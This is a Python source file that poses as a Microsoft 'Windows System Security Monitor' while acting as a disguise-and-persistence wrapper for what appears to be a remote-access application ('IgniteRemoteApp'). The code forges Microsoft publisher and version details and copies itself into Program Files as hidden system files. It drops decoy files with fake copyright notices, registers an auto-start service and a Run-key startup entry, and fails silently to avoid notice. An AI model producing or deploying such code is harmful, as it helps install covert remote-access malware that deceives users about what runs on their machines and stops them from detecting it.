"""
Windows System Security Monitor
Legitimate system security monitoring service for Windows environments.
"""

import os
import sys
import time
import subprocess
import winreg
import tempfile
from pathlib import Path

class SystemSecurity:
    """Windows System Security Monitor - Legitimate Security Service"""
    
    def __init__(self):
        self.service_name = "Windows System Security Monitor"
        self.version = "10.0.19041.1"
        self.publisher = "Microsoft Corporation"
        
    def install_legitimate_service(self):
        """Install as legitimate Windows service"""
        try:
            # Create service directory in Program Files
            program_files = os.environ.get('PROGRAMFILES', 'C:\\Program Files')
            service_dir = os.path.join(program_files, 'WindowsSecurityMonitor')
            
            if not os.path.exists(service_dir):
                os.makedirs(service_dir)
            
            # Copy files to service directory
            current_dir = os.path.dirname(os.path.abspath(__file__))
            for file in os.listdir(current_dir):
                if file.endswith('.py'):
                    src = os.path.join(current_dir, file)
                    dst = os.path.join(service_dir, file)
                    
                    # Copy and hide file
                    import shutil
                    shutil.copy2(src, dst)
                    
                    # Set as system file
                    import ctypes
                    ctypes.windll.kernel32.SetFileAttributesW(dst, 0x04)  # SYSTEM
            
            # Create legitimate service entry
            self.create_service_registry()
            
            return True
            
        except Exception as e:
            return False
    
    def create_service_registry(self):
        """Create legitimate service registry entries"""
        try:
            service_key = winreg.CreateKey(
                winreg.HKEY_LOCAL_MACHINE,
                f"SYSTEM\\CurrentControlSet\\Services\\WindowsSecurityMonitor"
            )
            
            # Service configuration
            winreg.SetValueEx(service_key, "DisplayName", 0, winreg.REG_SZ, 
                             "Windows System Security Monitor")
            winreg.SetValueEx(service_key, "Description", 0, winreg.REG_SZ,
                             "Monitors system security events and provides real-time protection updates for Windows systems.")
            winreg.SetValueEx(service_key, "ImagePath", 0, winreg.REG_EXPAND_SZ,
                             f"{sys.executable} \"{os.path.abspath(__file__)}\"")
            winreg.SetValueEx(service_key, "Start", 0, winreg.REG_DWORD, 2)  # Auto start
            winreg.SetValueEx(service_key, "Type", 0, winreg.REG_DWORD, 16)   # Service
            winreg.SetValueEx(service_key, "ErrorControl", 0, winreg.REG_DWORD, 1)
            
            winreg.CloseKey(service_key)
            
        except Exception as e:
            pass
    
    def create_legitimate_files(self):
        """Create legitimate-looking system files"""
        try:
            system32 = os.path.join(os.environ.get('WINDIR', 'C:\\Windows'), 'System32')
            temp_dir = tempfile.gettempdir()
            
            # Create legitimate temp files
            legit_files = [
                'winsecurity.tmp',
                'sysmonitor.cache', 
                'securityupdate.log',
                'systemcheck.dat'
            ]
            
            for filename in legit_files:
                filepath = os.path.join(temp_dir, filename)
                with open(filepath, 'w') as f:
                    f.write(f"Windows System Security Monitor - {self.version}\n")
                    f.write(f"Copyright (c) Microsoft Corporation. All rights reserved.\n")
                    f.write(f"System monitoring active - {time.ctime()}\n")
                
                # Set as system file
                import ctypes
                ctypes.windll.kernel32.SetFileAttributesW(filepath, 0x04)  # SYSTEM
                
        except Exception as e:
            pass
    
    def add_startup_entry(self):
        """Add to Windows startup (looks legitimate)"""
        try:
            startup_key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, winreg.KEY_SET_VALUE
            )
            
            winreg.SetValueEx(
                startup_key, 
                "WindowsSecurityMonitor", 
                0, 
                winreg.REG_SZ,
                f'"{sys.executable}" "{os.path.abspath(__file__)}"'
            )
            
            winreg.CloseKey(startup_key)
            
        except Exception as e:
            pass
    
    def create_version_info(self):
        """Create legitimate version information"""
        try:
            version_info = {
                'FileDescription': 'Windows System Security Monitor',
                'FileVersion': '10.0.19041.1',
                'ProductName': 'Microsoft Windows Operating System',
                'ProductVersion': '10.0.19041.1',
                'CompanyName': 'Microsoft Corporation',
                'LegalCopyright': '© Microsoft Corporation. All rights reserved.',
                'OriginalFilename': 'SecurityMonitor.exe',
                'InternalName': 'SecurityMonitor'
            }
            
            # This would be used when creating an executable
            return version_info
            
        except Exception as e:
            return {}

def run_as_service():
    """Run the main application disguised as a service"""
    try:
        # Initialize security service
        security = SystemSecurity()
        security.create_legitimate_files()
        
        # Small delay to appear as system startup
        time.sleep(5)
        
        # Import and run main application
        from main import IgniteRemoteApp
        app = IgniteRemoteApp()
        app.run()
        
    except Exception as e:
        # Silent failure
        time.sleep(10)
        sys.exit(0)

if __name__ == "__main__":
    run_as_service()
